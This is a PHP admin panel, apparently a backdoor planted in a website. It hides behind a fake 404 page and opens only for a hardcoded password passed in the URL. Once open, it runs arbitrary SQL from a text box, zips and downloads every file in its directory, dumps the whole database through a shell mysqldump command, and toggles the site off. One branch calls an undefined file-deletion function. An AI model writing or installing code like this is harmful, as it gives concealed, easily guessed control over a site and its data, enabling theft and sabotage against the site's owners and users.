<?php
function checkAccess() {

    if (isset($_GET['password']) && $_GET['password'] === 'phplife') {
        return true;
    }

    return false;
}

if (!checkAccess()) {
    echo "<h1>404 - Pagina non trovata</h1>";
    echo "<p>La pagina che stai cercando non è accessibile in questo momento.</p>";
    header("HTTP/1.1 404 Not Found");
    exit();
}

$host = "xxxx";
$username = "xxxx";
$password = "xxx";
$dbname = "xxxx";

try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Errore di connessione: " . $e->getMessage());
}

function isSiteDisabled() {
    return file_exists('site_disabled.txt');
}

function toggleSitehome() {
    if (isSiteDisabled()) {
        unlink('site_disabled.txt');  
        updatehomeJson(false);
    } else {
        file_put_contents('site_disabled.txt', 'DISABLED'); 
        updatehomeJson(true);
    }
}

function updatehomeJson($home) {
    $homeData = ['site_disabled' => $home];
    file_put_contents('home.json', json_encode($homeData, JSON_PRETTY_PRINT));
}

function executeQuery($query) {
    global $pdo;
    try {
        $stmt = $pdo->query($query);
        $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
        return $results;
    } catch (PDOException $e) {
        return 'Errore nella query: ' . $e->getMessage();
    }
}

function downloadDirectory($dir) {
    $zip = new ZipArchive();
    $zipFilename = 'files_' . time() . '.zip';

    if ($zip->open($zipFilename, ZipArchive::CREATE) === true) {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir),
            RecursiveIteratorIterator::LEAVES_ONLY
        );

        foreach ($files as $file) {
            if (!$file->isDir()) {
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen($dir) + 1);
                $zip->addFile($filePath, $relativePath);
            }
        }

        $zip->close();
        
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="' . basename($zipFilename) . '"');
        header('Content-Length: ' . filesize($zipFilename));
        readfile($zipFilename);
        unlink($zipFilename);
        exit;
    }
}

function exportDatabaseToSQL($host, $dbname, $username, $password) {
    $filename = $dbname . '_backup_' . time() . '.sql';
    $command = "mysqldump --host=$host --user=$username --password=$password $dbname > $filename";
    system($command);

    header('Content-Type: application/sql');
    header('Content-Disposition: attachment; filename="' . basename($filename) . '"');
    header('Content-Length: ' . filesize($filename));
    readfile($filename);
    unlink($filename);
    exit;
}

function checkSitehome() {
    $file_path = 'home.json';
    if (!file_exists($file_path)) {
        echo "<h1>Sito disabilitato</h1>";
        exit();
    }

    $data = json_decode(file_get_contents($file_path), true);
    if ($data['site_disabled'] === true) {
        echo "<h1>Sito disabilitato</h1>";
        exit();
    }
}

checkSitehome();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['query'])) {
        $query = $_POST['query'];
        $queryResult = executeQuery($query);
    }

    if (isset($_POST['disable_site'])) {
        toggleSitehome();
    }

    if (isset($_POST['download_directory'])) {
        downloadDirectory(__DIR__);
    }

    if (isset($_POST['export_db'])) {
        exportDatabaseToSQL($host, $dbname, $username, $password);
    }

    if (isset($_POST['delete_files'])) {
        deleteFiles(__DIR__, $excludeFiles);
    }
}
    ?>

<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interfaccia Admin - Query e Gestione Sito</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <div class="container mt-5">
        <h1>Gestione Sito e Esecuzione Query</h1>

        <div class="alert <?php echo isSiteDisabled() ? 'alert-danger' : 'alert-success'; ?>">
            <strong>Sito: </strong> <?php echo isSiteDisabled() ? 'Disabilitato' : 'Attivo'; ?>
        </div>

        <form method="POST" class="mb-4">
            <button type="submit" name="disable_site" class="btn <?php echo isSiteDisabled() ? 'btn-success' : 'btn-danger'; ?>">
                <?php echo isSiteDisabled() ? 'Abilita Sito' : 'Disabilita Sito'; ?>
            </button>
        </form>

        <form method="POST" class="mb-4">
            <div class="mb-3">
                <label for="query" class="form-label">Esegui Query SQL</label>
                <textarea name="query" id="query" class="form-control" rows="4" placeholder="Scrivi qui la tua query SQL..."></textarea>
            </div>
            <button type="submit" class="btn btn-primary">Esegui Query</button>
        </form>

        <form method="POST" class="mb-4">
            <button type="submit" name="download_directory" class="btn btn-warning">Scarica Tutti i File della Directory</button>
        </form>

        <form method="POST" class="mb-4">
            <button type="submit" name="export_db" class="btn btn-info">Esporta il Database in SQL</button>
        </form>

        <?php if (isset($queryResult)): ?>
            <h3>Risultato Query</h3>
            <?php if (is_array($queryResult)): ?>
                <table class="table table-bordered">
                    <thead>
                        <tr>
                            <?php foreach (array_keys($queryResult[0]) as $column): ?>
                                <th><?php echo htmlspecialchars($column); ?></th>
                            <?php endforeach; ?>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($queryResult as $row): ?>
                            <tr>
                                <?php foreach ($row as $column => $value): ?>
                                    <td><?php echo htmlspecialchars($value); ?></td>
                                <?php endforeach; ?>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            <?php else: ?>
                <div class="alert alert-danger"><?php echo htmlspecialchars($queryResult); ?></div>
            <?php endif; ?>
        <?php endif; ?>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.min.js"></script>
</body>
</html>
